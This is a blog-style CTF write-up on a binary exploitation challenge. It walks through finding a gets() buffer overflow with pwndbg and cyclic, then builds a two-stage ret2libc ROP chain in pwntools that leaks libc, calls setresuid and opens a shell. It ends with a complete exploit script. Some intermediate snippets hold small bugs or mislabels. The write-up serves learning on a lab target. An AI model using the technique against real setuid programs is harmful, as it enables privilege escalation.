---
layout: post
title: Writeup ~ YHROCUCTF - Binary Challenge 4
subtitle: My first touch with pwntools and ROP
#gh-repo: daattali/beautiful-jekyll
#gh-badge: [star, fork, follow]
tags: [ctf, writeup, pwn, rop]
comments: true
author: M0S4YSH3LL0
---

Welcome to my very first writeup on a binary exploitation challenge I took on as part of the YHROCUCTF.

## Prologue

I took part in the **YHROCU** (Yorkshire and Hamold Organised Crime Unit) CTF event, the [YHROCUCTF](https://yhrocuctf.com/). It was super fun, especially the binary exploitation challenge that was available. For this reason, I would like to write this report to share my thinking and learning process with you.

## The challenge

The description of the challenge is as follows:
```
Use the "binary-exploit-4" program to gain the privileges
of ctf-flag-4, once you have them run "newgrp" 
to be able to read the flag.

If you get the flag, Joe owes you a pint (as long as you explain how you did it + save your exploit to show him).

Seriously, fair play.

....good luck
```

You can download the binary [here]().

The challenge is originally hosted on a remote host, but I don't want to reveal any login details here, so you have to log in to the CTF site for the real flag.

If you log in to the remote server as user `ctf-user-4`, you get the binary and the `flag.txt` file owned by user `ctf-flag-4`. We need to somehow get the rights of `ctf-flag-4` by executing the binary to see the flag.

In this writeup I will cover the `local` exploitation, so make sure to download the binary as well as create a `flag.txt` file which is owned by another user, so you can not access it by `cat`ing it.


## Analyising the binary

Let's first check what we have here. To see what kind of binary file we are working with, we can run the "file" command.

~~~
file ./binary-exploit-4 
~~~

~~~
binary-exploit-4: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f1b4bbf4c34b712b7ede57d6865746f8fb057424, for GNU/Linux 3.2.0, not stripped
~~~

As we can see, we are working with a `64-bit` executable that is not stripped, which means that we will see some debugging symbols when we analyse it later with `gdb`, sweet.

Now we run the programme to see what we are presented with.
~~~
./binary-exploit-4 
~~~

~~~
Hello there!
What is your name?
m0
Nice
~~~

We are asked what our name is and then receive the answer "Nice".

Okay, now let's see how the programme works in `gdb`. For this I use `pwndbg`, which offers some neat additional functions when analysing binary files.

~~~
pwndbg ./binary-exploit-4
~~~

Sooo, let's take a look at which functions are contained in this binary and what the code flow looks like.

~~~
info functions
~~~

~~~
0x0000000000401000  _init
0x0000000000401070  puts@plt
0x0000000000401080  setresuid@plt
0x0000000000401090  geteuid@plt
0x00000000004010a0  gets@plt
0x00000000004010b0  _start
0x00000000004010e0  _dl_relocate_static_pie
0x00000000004010f0  deregister_tm_clones
0x0000000000401120  register_tm_clones
0x0000000000401160  __do_global_dtors_aux
0x0000000000401190  frame_dummy
0x0000000000401196  run
0x00000000004011da  main
0x0000000000401220  __libc_csu_init
0x0000000000401290  __libc_csu_fini
0x0000000000401298  _fini
~~~

As we can see we have two functions here, one is `main` and one is `run`. Since the entrypoint of the binary seems to be the `main` function, we want to examine it first and have a look at the disassembly.

~~~
disassemble main
~~~
~~~
Dump of assembler code for function main:
   0x00000000004011da <+0>:	endbr64
   0x00000000004011de <+4>:	push   rbp
   0x00000000004011df <+5>:	mov    rbp,rsp
   0x00000000004011e2 <+8>:	sub    rsp,0x20
   0x00000000004011e6 <+12>:	mov    DWORD PTR [rbp-0x14],edi
   0x00000000004011e9 <+15>:	mov    QWORD PTR [rbp-0x20],rsi
   0x00000000004011ed <+19>:	call   0x401090 <geteuid@plt>
   0x00000000004011f2 <+24>:	mov    DWORD PTR [rbp-0x4],eax
   0x00000000004011f5 <+27>:	mov    edx,DWORD PTR [rbp-0x4]
   0x00000000004011f8 <+30>:	mov    ecx,DWORD PTR [rbp-0x4]
   0x00000000004011fb <+33>:	mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004011fe <+36>:	mov    esi,ecx
   0x0000000000401200 <+38>:	mov    edi,eax
   0x0000000000401202 <+40>:	mov    eax,0x0
   0x0000000000401207 <+45>:	call   0x401080 <setresuid@plt>
   0x000000000040120c <+50>:	mov    eax,0x0
   0x0000000000401211 <+55>:	call   0x401196 <run>
   0x0000000000401216 <+60>:	mov    eax,0x0
   0x000000000040121b <+65>:	leave
   0x000000000040121c <+66>:	ret
~~~

For now, we'll just focus on the spicy parts, the `call` statements.
First we call `geteuid` to get the effective user id of the current user.
Then we fill the required registers for the `setresuid` function call, which sets the real user id. Looks like a spicy function that we can use later to get the privileges of the user who owns the `flag.txt`.
And last but not least, we call the `run` function, which we will now examine.

~~~
disassemble run
~~~
~~~
Dump of assembler code for function run:
   0x0000000000401196 <+0>:	endbr64
   0x000000000040119a <+4>:	push   rbp
   0x000000000040119b <+5>:	mov    rbp,rsp
   0x000000000040119e <+8>:	sub    rsp,0x40
   0x00000000004011a2 <+12>:	lea    rdi,[rip+0xe5b]        # 0x402004
   0x00000000004011a9 <+19>:	call   0x401070 <puts@plt>
   0x00000000004011ae <+24>:	lea    rdi,[rip+0xe5c]        # 0x402011
   0x00000000004011b5 <+31>:	call   0x401070 <puts@plt>
   0x00000000004011ba <+36>:	lea    rax,[rbp-0x40]
   0x00000000004011be <+40>:	mov    rdi,rax
   0x00000000004011c1 <+43>:	mov    eax,0x0
   0x00000000004011c6 <+48>:	call   0x4010a0 <gets@plt>
   0x00000000004011cb <+53>:	lea    rdi,[rip+0xe52]        # 0x402024
   0x00000000004011d2 <+60>:	call   0x401070 <puts@plt>
   0x00000000004011d7 <+65>:	nop
   0x00000000004011d8 <+66>:	leave
   0x00000000004011d9 <+67>:	ret
~~~

Here we have 4 "call" instructions.
The first two `puts` calls will output the greeting and the question about our name.
Before each call to `puts` we load a value into the `rdi` register, which is basically the first argument to our function according to the `x86_64` calling conventions.

Let's take a look at what we load in `rdi` for the first two `puts` calls:
~~~
x/s 0x402004
~~~
~~~
0x402004:	"Hello there!"
~~~

~~~
x/s 0x402011
~~~
~~~
0x402011:	"What is your name?"
~~~

The next function call is the one we are patiently waiting for: the call to the dangerous `gets` function.
This is our ticket to controlling the code flow of this binary. Let's find out how much input we can provide to crash the binary with a `segmentation fault`.

Before we tinker around with the input, we want to set a breakpoint to `ret` of the `run` function.

~~~
b *0x00000000004011d9
~~~

Now we want to create a unique pattern so that if we overwrite a return address, we can easily check at which point in our input we are overwriting it.

I do this with the `cyclic` module of `pwntools`
~~~
cyclic 100
~~~
~~~
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
~~~

Let's execute the binary in `pwndbg`:
~~~
run
~~~

When we are asked for our name, we copy and paste our unique pattern.

This is what we get:
~~~
 â–º 0x4011d9 <run+67>    ret    <0x616161616161616a>
~~~

Jackpot! We triggered a segmentation fault in the binary because our pattern overwrote the return address of the `run` function.

We overwrote the return address with `0x616161616161616a`, nice!

Next we want to check at which offset we overwrote, with:
~~~
cyclic -l 0x616161616161616a
~~~
~~~
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
~~~

This means that we have to enter `72` characters before we can overwrite the sender address. Great! Now let's check the code flow!

So, what to do now?
We need to somehow return to the `setresuid` function to set our uid to that of the owner of `flag.txt`.

To do this we need to assemble a ROP chain.

## Exploit strategy
Since we are controlling the code flow now, we need to think about how to abuse this.

The strategy is as follows:
- Fill the buffer with junk of `72` characters
- populate `rdi` with our target uid, since it is the first argument for our `setresuid` call
- call to `setresuid`
- populate `rdi` with `/bin/sh`
- call to `system`
- call to `exit`


But wait... we don't have any references to `system` or a string with `/bin/sh` in our challenge binary...

Hmmmm... 

I have an idea! 
Maybe we can use the `libc` code already built in, which is used in the challenge binary, and look for the rest of the stuff there.

This technique is called `ret2libc`.

The only problem is that the `libc` is loaded into other areas of our memory each time the binary file is executed.

So we need to find a way to read the memory address of a function at runtime and then use it to calculate the base address of the `libc` to find our symbols and functions later.

We can use the function `puts` to literally print out the memory address of a given function, e.g. `gets` at runtime

Okay, so we need two stages in our chain.
The first is to print out the memory address of a function from `libc` at runtime, return to the `run` function to send the second stage and use this leaked address to calculate the base address of `libc`.

The second stage is to fill `rdi` for `setresuid`, call `setresuid`, fill `rdi` with `/bin/sh`, which we will probably find in `libc`, and the function call of `system`.

Okay, let's find our gadgets!


## Writing our exploit
To perform a `ret2libc` exploit, we need to find some useful ROP gadgets to achieve our goal.

Let's start our favourite IDE and get started:

```python
from pwn import *

context.arch = 'amd64'

elf = ELF(./binary-exploit-4)
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
p = elf.process()
```

Here we import our useful `pwntools` functions and create an ELF object of the binary file from which we start a process.
We also load our local `libc` into an ELF object so that we can use it later to find our gadgets.

```python
rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['gets']])
rop.call(elf.symbols['run'])
```
We use the `ROP` object of `pwntools` to simply make a call to `puts` with one argument: the GOT entry of the `gets` function.
Since `gets` is a shared function of `libc`, the GOT entry is the relative offset in memory of `gets`.
And then we return to `run` for our second step.

```python
p.recvuntil(b"name?\n")

stage1 = b''.join([
     junk,
     rop.chain()
])

p.sendline(stage1)
ret = p.recv(2048).rstrip(b"\nHello there!\nWhat is your name?").lstrip(b"Nice\n").ljust(8, b'\x00')

gets_addr_bin = u64(ret)
gets_libc_addr = libc.symbols['gets']
libc_base_addr = gets_addr_bin - gets_addr_libc
libc.address = libc_base_addr

log.info(f"gets (libc) @ {hex(gets_addr_libc)}")
log.info(f"gets (elf) @ {hex(gets_addr_bin)}")
log.info(f"libc base @ {hex(libc.address)}")
```

Here we receive bytes from our process until we are asked for our name.

Then we assemble our first stage payload, format it as a binary string and send it off.

We then get our address from `gets` within the binary at runtime, strip and pad it a little and unpack the binary data into an integer.

Now we are able to calculate the base address of `libc` by subtracting the `gets` address inside `libc` from the `gets` address we just leaked from memory at runtime.

Stage 1 is done! Ready for stage 2?

For the second stage, we need to work a little further:

```python
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b"/bin/sh\x00"))
exit_addr = libc.symbols['exit']

log.info(f"pop rdi gadget @ {hex(pop_rdi_ret)}")
log.info(f"system @ {hex(system_addr)}")
log.info(f"bin_sh @ {hex(bin_sh)}")
log.info(f"exit @ {hex(exit_addr)}")

stage2 = b''.join([
    junk,
    p64(pop_rdi_ret),
    p64(uid),
    p64(setresuid_addr),
    p64(pop_rdi_ret),
    p64(bin_sh),
    p64(system_addr),
    p64(exit_addr)
])
```

The first gadget we are looking for is one that populates the "rdi" register and then returns. 
So: we need a `pop rdi; ret` gadget.
Now that we have successfully set the base address of `libc`, we can simply read the `system` symbol and get the correct address of the symbol.

Next, we need to look for the string `/bin/sh` to use as the first argument.

Last but not least, we want to exit `exit` to have a clean flow.

Then we can assemble our stage 2:
- Fill it with junk
- our `pop rdi; ret` gadget
- followed by the target uid we want to set in `rdi`.
- call `setresuid`
- again our `pop rdi; ret` gadget to populate `rdi` again for the `system` call
- calling `system` and `exit`


Now we just need to send the payload:
```python
p.sendline(stage2)
p.interactive()
```

If we run the exploit script, we will see:

~~~
[*] Loaded 14 cached gadgets for './binary-exploit-4'
[*] gets (libc) @ 0x76f30
[*] gets (elf) @ 0x7f20fa940f30
[*] libc base @ 0x7f20fa8ca000
[*] pop rdi gadget @ 0x401283
[*] system @ 0x7f20fa916330
[*] bin_sh @ 0x7f20faa60031
[*] exit @ 0x7f20fa908590
[*] Switching to interactive mode
Nice
$ id
uid=1002(ctf-flag-4) gid=0(root) groups=0(root),111(kismet)
$  
~~~

JACKPOT! We got a shell and also set the uid to `1002` = `ctf-flag-4`.

Now just run `newgrp` and then we can `cat` our precious `flag.txt`!


## Final exploit (cleaned up and made pretty)

```python
from pwn import *


context.arch = 'amd64'
elf = ELF('./binary-exploit-4')
p = elf.process()
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

gets_addr_libc = libc.symbols['gets']
gets_addr_bin = None
setresuid_addr = elf.plt['setresuid']
libc_base_addr = None

offset = 72

uid = 1002

junk = b'A' * offset

### STAGE 1 to get libc base address
rop = ROP(elf)
rop.call(elf.symbols['puts'], [elf.got['gets']])
rop.call(elf.symbols['run'])

p.recvuntil(b"name?\n")

stage1 = b''.join([
     junk,
     rop.chain()
])

p.sendline(stage1)
ret = p.recv(2048).rstrip(b"\nHello there!\nWhat is your name?").lstrip(b"Nice\n").ljust(8, b'\x00')

gets_addr_bin = u64(ret)

## calculate libc base address so we can find gadgets
libc_base_addr = gets_addr_bin - gets_addr_libc
libc.address = libc_base_addr

log.info(f"gets (libc) @ {hex(gets_addr_libc)}")
log.info(f"gets (elf) @ {hex(gets_addr_bin)}")
log.info(f"libc base @ {hex(libc.address)}")


### STAGE 2 for final exploiting, ROP chain of pop gadgets and finally /bin/sh
pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
system_addr = libc.symbols['system']
bin_sh = next(libc.search(b"/bin/sh\x00"))
exit_addr = libc.symbols['exit']

log.info(f"pop rdi gadget @ {hex(pop_rdi_ret)}")
log.info(f"system @ {hex(system_addr)}")
log.info(f"bin_sh @ {hex(bin_sh)}")
log.info(f"exit @ {hex(exit_addr)}")

stage2 = b''.join([
    junk,
    p64(pop_rdi_ret),
    p64(uid),
    p64(setresuid_addr),
    p64(pop_rdi_ret),
    p64(bin_sh),
    p64(system_addr),
    p64(exit_addr)
])

p.sendline(stage2)
p.interactive()
```

## Epilogue

I learnt a lot while working on this task. I learnt about `ROP` in general and about the use of `pwntools`.

I appreciate any feedback, as I know my text and explanations are not technically correct, haha! I want to improve and learn more!